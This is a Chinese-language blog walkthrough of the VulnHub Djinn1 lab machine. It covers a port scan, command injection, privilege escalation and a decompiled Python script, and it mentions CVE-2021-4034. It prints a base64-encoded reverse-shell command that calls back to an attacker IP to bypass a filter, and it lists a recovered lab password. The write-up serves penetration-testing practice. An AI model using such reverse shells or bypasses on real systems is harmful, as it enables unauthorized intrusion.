@@ -1,0 +1,255 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0x078 Djinn1 | 养猪日记</title>
+<meta name=keywords content><meta name=description content='端口扫描
+
+
+
+
+
+
+渗透
+FTP：
+
+
+这里有几个信息，1337端口？nitish81299、nitu:81299
+
+
+HTTP：
+
+
+命令执行：
+
+
+
+
+用burp抓包可以发现是个重定向：
+
+
+反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==" | base64 -d | bash
+
+
+提权
+
+
+发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：
+
+
+然后在nitish的家目录下面找到密码：
+nitish:p4ssw0rdStr3r0n9
+
+
+切换到sam用户，用gtfobin的方法，这里都执行失败了，
+
+
+这里又有一个坑，使用-h看到的参数里面都没法执行成功：
+
+
+但是man可以：
+
+
+然后就是，随便带一个参数就可以提权：
+
+
+sudo提权这里不知道怎么利用：
+
+
+去sam家目录下面翻查，有一个.pyc的文件：
+
+
+传出来：
+
+
+
+
+反编译：
+https://tool.lu/pyc/
+
+'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0x078 Djinn1"><meta property="og:description" content='端口扫描
+
+
+
+
+
+
+渗透
+FTP：
+
+
+这里有几个信息，1337端口？nitish81299、nitu:81299
+
+
+HTTP：
+
+
+命令执行：
+
+
+
+
+用burp抓包可以发现是个重定向：
+
+
+反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==" | base64 -d | bash
+
+
+提权
+
+
+发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：
+
+
+然后在nitish的家目录下面找到密码：
+nitish:p4ssw0rdStr3r0n9
+
+
+切换到sam用户，用gtfobin的方法，这里都执行失败了，
+
+
+这里又有一个坑，使用-h看到的参数里面都没法执行成功：
+
+
+但是man可以：
+
+
+然后就是，随便带一个参数就可以提权：
+
+
+sudo提权这里不知道怎么利用：
+
+
+去sam家目录下面翻查，有一个.pyc的文件：
+
+
+传出来：
+
+
+
+
+反编译：
+https://tool.lu/pyc/
+
+'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0x078 Djinn1"><meta name=twitter:description content='端口扫描
+
+
+
+
+
+
+渗透
+FTP：
+
+
+这里有几个信息，1337端口？nitish81299、nitu:81299
+
+
+HTTP：
+
+
+命令执行：
+
+
+
+
+用burp抓包可以发现是个重定向：
+
+
+反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==" | base64 -d | bash
+
+
+提权
+
+
+发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：
+
+
+然后在nitish的家目录下面找到密码：
+nitish:p4ssw0rdStr3r0n9
+
+
+切换到sam用户，用gtfobin的方法，这里都执行失败了，
+
+
+这里又有一个坑，使用-h看到的参数里面都没法执行成功：
+
+
+但是man可以：
+
+
+然后就是，随便带一个参数就可以提权：
+
+
+sudo提权这里不知道怎么利用：
+
+
+去sam家目录下面翻查，有一个.pyc的文件：
+
+
+传出来：
+
+
+
+
+反编译：
+https://tool.lu/pyc/
+
+'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0x078 Djinn1","item":"https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0x078 Djinn1","name":"0x078 Djinn1","description":"端口扫描 渗透 FTP：\n这里有几个信息，1337端口？nitish81299、nitu:81299\nHTTP：\n命令执行：\n用burp抓包可以发现是个重定向：\n反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：\necho \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==\u0026#34; | base64 -d | bash 提权 发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：\n然后在nitish的家目录下面找到密码：\nnitish:p4ssw0rdStr3r0n9\n切换到sam用户，用gtfobin的方法，这里都执行失败了，\n这里又有一个坑，使用-h看到的参数里面都没法执行成功：\n但是man可以：\n然后就是，随便带一个参数就可以提权：\nsudo提权这里不知道怎么利用：\n去sam家目录下面翻查，有一个.pyc的文件：\n传出来：\n反编译：\nhttps://tool.lu/pyc/\n","keywords":[],"articleBody":"端口扫描 渗透 FTP：\n这里有几个信息，1337端口？nitish81299、nitu:81299\nHTTP：\n命令执行：\n用burp抓包可以发现是个重定向：\n反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：\necho \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==\" | base64 -d | bash 提权 发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：\n然后在nitish的家目录下面找到密码：\nnitish:p4ssw0rdStr3r0n9\n切换到sam用户，用gtfobin的方法，这里都执行失败了，\n这里又有一个坑，使用-h看到的参数里面都没法执行成功：\n但是man可以：\n然后就是，随便带一个参数就可以提权：\nsudo提权这里不知道怎么利用：\n去sam家目录下面翻查，有一个.pyc的文件：\n传出来：\n反编译：\nhttps://tool.lu/pyc/\n#!/usr/bin/env python\r# visit https://tool.lu/pyc/ for more information\r# Version: Python 2.7\rfrom getpass import getuser\rfrom os import system\rfrom random import randint\rdef naughtyboi():\rprint 'Working on it!! '\rdef guessit():\rnum = randint(1, 101)\rprint 'Choose a number between 1 to 100: '\rs = input('Enter your number: ')\rif s == num:\rsystem('/bin/sh')\relse:\rprint 'Better Luck next time'\rdef readfiles():\ruser = getuser()\rpath = input('Enter the full of the file to read: ')\rprint 'User %s is not allowed to read %s' % (user, path)\rdef options():\rprint 'What do you want to do ?'\rprint '1 - Be naughty'\rprint '2 - Guess the number'\rprint '3 - Read some damn files'\rprint '4 - Work'\rchoice = int(input('Enter your choice: '))\rreturn choice\rdef main(op):\rif op == 1:\rnaughtyboi()\relif op == 2:\rguessit()\relif op == 3:\rreadfiles()\relif op == 4:\rprint 'work your ass off!!'\relse:\rprint 'Do something better with your life'\rif __name__ == '__main__':\rmain(options()) 大概看一下，可以知道整个逻辑，当输入的内容等于num的时候，执行/bin/sh，那么这里其实理论上运气足够好，或者写个脚本一直怼着一个数字跑，应该是可以直接拿到shell的，但是这种方法明显不靠谱，在这里python2中，\n2021-4034秒了：\n","wordCount":"200","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/vulnhub/0x078-djinn1/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0x078 Djinn1</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;200 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE32d366749858f384b258b752e94a4555image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE8bff7a9e9a70b6b4389424a5314dc4a1image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEcaa498add233ae75057ecb27b2f7af48image.png alt></p><h1 id=渗透>渗透<a hidden class=anchor aria-hidden=true href=#渗透>#</a></h1><p>FTP：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE9c508adcba3bbe67f5ba8672f778cbedimage.png alt></p><p>这里有几个信息，1337端口？nitish81299、nitu:81299</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE28cf9501e1386257869e0ecc2dfe189cimage.png alt></p><p>HTTP：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE56c3137b5f4bf4648827e8f7fc6c033bimage.png alt></p><p>命令执行：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE008cfbe77d712786215abc017467fb64image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEf52666b561ae6d53df6e1b04f1302739image.png alt></p><p>用burp抓包可以发现是个重定向：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE94786b2ab29c9817b29c1a8d95408c20image.png alt></p><p>反弹shell，弹了半天，弹不动，后面看了一下，这里是过滤了，得用base64绕过：</p><pre tabindex=0><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuNjYvODg4OCAwPiYxCg==&#34; | base64 -d | bash
+</code></pre><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEdbaf6d5b9c645fda8da1e122548ce48fimage.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEd574aa49ef46874eac356a3cf4f63212image.png alt></p><p>发现SUID，不过不是root的，并且没有执行权限，看样子得提权到nitish才行：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE236e0ff3dba9d9a66f092e7de1b11d8dimage.png alt></p><p>然后在nitish的家目录下面找到密码：</p><p>nitish:p4ssw0rdStr3r0n9</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE7ca081e0461a31522c964c593daf591dimage.png alt></p><p>切换到sam用户，用gtfobin的方法，这里都执行失败了，</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc683522e6f1484e907b650a8a9fb899fimage.png alt></p><p>这里又有一个坑，使用-h看到的参数里面都没法执行成功：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE5222747087bbc5564aba2b847411d9eaimage.png alt></p><p>但是man可以：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE0d9988f2265199aee2a8203785458e5fimage.png alt></p><p>然后就是，随便带一个参数就可以提权：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE61dfb0f6d86c449c7b8a46afa28a7c6cimage.png alt></p><p>sudo提权这里不知道怎么利用：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCEc5d855c8b22f37d0f91a1fac4fd2cd5aimage.png alt></p><p>去sam家目录下面翻查，有一个.pyc的文件：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE73196c0a316200d848a11d085ec09e94image.png alt></p><p>传出来：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE95edb9c1f70249eea6a045d446210497image.png alt></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE63440625801c3d345ed09e410426e479image.png alt></p><p>反编译：</p><p><a href=https://tool.lu/pyc/>https://tool.lu/pyc/</a></p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE5ef5e9e34de05e7716a88837f112d19cimage.png alt></p><pre tabindex=0><code>#!/usr/bin/env python
+# visit https://tool.lu/pyc/ for more information
+# Version: Python 2.7
+
+from getpass import getuser
+from os import system
+from random import randint
+
+def naughtyboi():
+    print &#39;Working on it!! &#39;
+
+
+def guessit():
+    num = randint(1, 101)
+    print &#39;Choose a number between 1 to 100: &#39;
+    s = input(&#39;Enter your number: &#39;)
+    if s == num:
+        system(&#39;/bin/sh&#39;)
+    else:
+        print &#39;Better Luck next time&#39;
+
+
+def readfiles():
+    user = getuser()
+    path = input(&#39;Enter the full of the file to read: &#39;)
+    print &#39;User %s is not allowed to read %s&#39; % (user, path)
+
+
+def options():
+    print &#39;What do you want to do ?&#39;
+    print &#39;1 - Be naughty&#39;
+    print &#39;2 - Guess the number&#39;
+    print &#39;3 - Read some damn files&#39;
+    print &#39;4 - Work&#39;
+    choice = int(input(&#39;Enter your choice: &#39;))
+    return choice
+
+
+def main(op):
+    if op == 1:
+        naughtyboi()
+    elif op == 2:
+        guessit()
+    elif op == 3:
+        readfiles()
+    elif op == 4:
+        print &#39;work your ass off!!&#39;
+    else:
+        print &#39;Do something better with your life&#39;
+
+if __name__ == &#39;__main__&#39;:
+    main(options())
+</code></pre><p>大概看一下，可以知道整个逻辑，当输入的内容等于num的时候，执行/bin/sh，那么这里其实理论上运气足够好，或者写个脚本一直怼着一个数字跑，应该是可以直接拿到shell的，但是这种方法明显不靠谱，在这里python2中，</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE00a142e4a60fb0c51727382ef913d3fcimage.png alt></p><p>2021-4034秒了：</p><p><img loading=lazy src=/vulnhub_img/WEBRESOURCE33c797731ace0408053033aee073703dimage.png alt></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x077-digitalworld.localmercyv2/><span class=title>« Prev</span><br><span>0x077 Digitalworld.local(Mercyv2)</span>
+</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x079-escalate_linux1/><span class=title>Next »</span><br><span>0x079 Escalate_Linux1</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
